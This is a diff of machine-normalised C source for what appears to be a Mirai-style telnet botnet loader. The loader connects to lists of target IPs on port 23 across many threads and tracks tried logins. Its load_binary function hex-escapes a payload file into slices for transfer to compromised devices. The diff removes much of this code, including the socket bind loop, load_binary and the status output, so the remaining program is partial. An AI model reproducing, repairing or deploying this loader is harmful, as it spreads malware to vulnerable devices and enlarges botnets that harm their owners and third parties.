-    dest_addr.sin_zero[5] = (unsigned char)0;
-    dest_addr.sin_zero[6] = (unsigned char)0;
-    dest_addr.sin_zero[7] = (unsigned char)0;
     memset((void *)(& dest_addr), 0, sizeof(struct sockaddr_in ));
     dest_addr.sin_family = (sa_family_t )2;
     dest_addr.sin_port = htons((uint16_t )23);
     dest_addr.sin_addr.s_addr = inet_addr((char const   *)token);
     fd = 0;
-    my_addr.sin_family = (sa_family_t )0;
-    my_addr.sin_port = (unsigned short)0;
-    my_addr.sin_addr.s_addr = 0U;
-    my_addr.sin_zero[0] = (unsigned char)0;
-    my_addr.sin_zero[1] = (unsigned char)0;
-    my_addr.sin_zero[2] = (unsigned char)0;
-    my_addr.sin_zero[3] = (unsigned char)0;
-    my_addr.sin_zero[4] = (unsigned char)0;
-    my_addr.sin_zero[5] = (unsigned char)0;
-    my_addr.sin_zero[6] = (unsigned char)0;
-    my_addr.sin_zero[7] = (unsigned char)0;
-    while (1) {
-      tmp___2 = __errno_location();
-      if (*tmp___2 != 9) {
-        if (fd > 0) {
-          close(fd);
-        }
-      }
-      fd = 0;
-      fd = socket(2, 1, 6);
-      if (fd < 0) {
-        perror("cant open socket");
-        exit(-1);
-      }
-      tmp___3 = fcntl(fd, 3, (void *)0);
-      fcntl(fd, 4, tmp___3 | 2048);
-      flag = 1;
-      setsockopt(fd, 6, 1, (void const   *)((char *)(& flag)), (socklen_t )sizeof(int ));
-      memset((void *)(& my_addr), 0, sizeof(struct sockaddr_in ));
-      my_addr.sin_addr.s_addr = inet_addr((char const   *)bind_ip);
-      tmp___4 = port;
-      port = (unsigned short volatile   )((int volatile   )port + (int volatile   )1);
-      my_addr.sin_port = htons((uint16_t )tmp___4);
-      my_addr.sin_family = (sa_family_t )2;
-      tmp___5 = __errno_location();
-      *tmp___5 = 0;
-      tmp___6 = bind(fd, (struct sockaddr  const  * __restrict  )((struct sockaddr *)(& my_addr)),
-                     (socklen_t )sizeof(my_addr));
-      if (! (tmp___6 != 0)) {
-        break;
-      }
-    }
+
     printf((char const   * __restrict  )"bound\n");
     res = 0;
     res = connect(fd, (struct sockaddr  const  * __restrict  )((struct sockaddr *)(& dest_addr)),
@@ -1552,9 +709,6 @@ void *loader(void *threadCount )
         close(fd);
         continue;
       }
-    }
-    if ((unsigned int volatile   )fd > maxFDSaw) {
-      maxFDSaw = (unsigned int volatile   )(fd + 1);
     }
     pthread_mutex_lock(& stateTable[fd].mutex);
     if (! stateTable[fd].slotUsed) {
@@ -1605,82 +759,9 @@ void *loader(void *threadCount )
     }
     sleep(1U);
   }
-  close(epollFD);
 }
 }
-extern int ( /* missing proto */  ceil)() ;
-int load_binary(char *path )
-{
-  int fd ;
-  int size ;
-  int got ;
-  int i ;
-  int slice ;
-  unsigned char ch ;
-  ssize_t tmp ;
-  void *tmp___0 ;
-  void *tmp___1 ;
-  ssize_t tmp___2 ;
-  size_t tmp___3 ;
 
-  {
-  size = 0;
-  got = 0;
-  slice = 0;
-  fd = open((char const   *)path, 0);
-  if (fd == -1) {
-    return (-1);
-  }
-  while (1) {
-    tmp = read(fd, (void *)(& ch), (size_t )1);
-    got = (int )tmp;
-    if (! (got > 0)) {
-      break;
-    }
-    size ++;
-  }
-  close(fd);
-  binary.num_slices = ceil((double )((float )size / (float )128));
-  tmp___0 = calloc((size_t )binary.num_slices, sizeof(unsigned char *));
-  binary.slices = (unsigned char **)tmp___0;
-  if ((unsigned long )binary.slices == (unsigned long )((void *)0)) {
-    return (-1);
-  }
-  i = 0;
-  while (i < binary.num_slices) {
-    tmp___1 = calloc((size_t )1, (size_t )641);
-    *(binary.slices + i) = (unsigned char *)tmp___1;
-    if ((unsigned long )*(binary.slices + i) == (unsigned long )((void *)0)) {
-      return (-1);
-    }
-    i ++;
-  }
-  fd = open((char const   *)path, 0);
-  if (fd == -1) {
-    return (-1);
-  }
-  while (1) {
-    i = 0;
-    while (i < 128) {
-      tmp___2 = read(fd, (void *)(& ch), (size_t )1);
-      got = (int )tmp___2;
-      if (got != 1) {
-        break;
-      }
-      tmp___3 = strlen((char const   *)*(binary.slices + slice));
-      sprintf((char * __restrict  )(*(binary.slices + slice) + tmp___3), (char const   * __restrict  )"\\\\x%02X",
-              (int )ch);
-      i ++;
-    }
-    slice ++;
-    if (! (got > 0)) {
-      break;
-    }
-  }
-  close(fd);
-  return (0);
-}
-}
 int main(int argc , char **argv )
 {
   int threads ;
@@ -1700,17 +781,12 @@ int main(int argc , char **argv )
   int tmp___5 ;
 
   {
-  if (argc < 4) {
-    fprintf((FILE * __restrict  )stderr, (char const   * __restrict  )"Invalid parameters!\n");
-    fprintf((FILE * __restrict  )stdout, (char const   * __restrict  )"Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n",
-            *(argv + 0));
-    exit(-1);
-  }
+
   signal(13, (void (*)(int  ))1);
   epollFD = epoll_create(57005);
   bind_ip = *(argv + 1);
   infd = fopen((char const   * __restrict  )*(argv + 2), (char const   * __restrict  )"r");
-  signal(2, & sighandler);
+
   tmp = atoi((char const   *)*(argv + 5));
   threads = tmp;
   maxConnectedSockets = atoi((char const   *)*(argv + 6));
@@ -1722,7 +798,6 @@ int main(int argc , char **argv )
     pthread_mutex_init(& stateTable[i].mutex, (pthread_mutexattr_t const   *)((void *)0));
     i ++;
   }
-  load_binary(*(argv + 3));
   run_arg = *(argv + 4);
   pthread_create((pthread_t * __restrict  )(& thread), (pthread_attr_t const   * __restrict  )((void *)0),
                  & loader, (void * __restrict  )((void *)(& threads)));
@@ -1745,31 +820,7 @@ int main(int argc , char **argv )
     temp[tmp___2] = (char)0;
     tmp___2 ++;
   }
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Loaded");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"State Timeout");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"No Connect");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Closed Us");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Logins Tried");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"B/s");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Connected");
-  printf((char const   * __restrict  )"%-16s", temp);
-  memset((void *)(temp), 0, (size_t )17);
-  sprintf((char * __restrict  )(temp), (char const   * __restrict  )"Running Thrds");
-  printf((char const   * __restrict  )"%s", temp);
-  printf((char const   * __restrict  )"\n");
+
   sleep(1U);
   tmp___3 = malloc((size_t )96);
   new = (char *)tmp___3;
@@ -1784,8 +835,7 @@ int main(int argc , char **argv )
     }
     printf((char const   * __restrict  )"\r");
     memset((void *)new, '\000', (size_t )96);
-    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
-            found_srvs);
+
     sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
             timed_out);
     sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
@@ -1796,11 +846,8 @@ int main(int argc , char **argv )
             login_done);
     sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15d", new,
             bytes_sent);
-    tmp___4 = getConnectedSockets();
-    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15lu", new,
-            tmp___4);
-    sprintf((char * __restrict  )new, (char const   * __restrict  )"%s|%-15d", new,
-            running_threads);
+    tmp___4 = 0;
+
     printf((char const   * __restrict  )"%s", new);
     fflush(stdout);
     bytes_sent = (unsigned int volatile   )0;
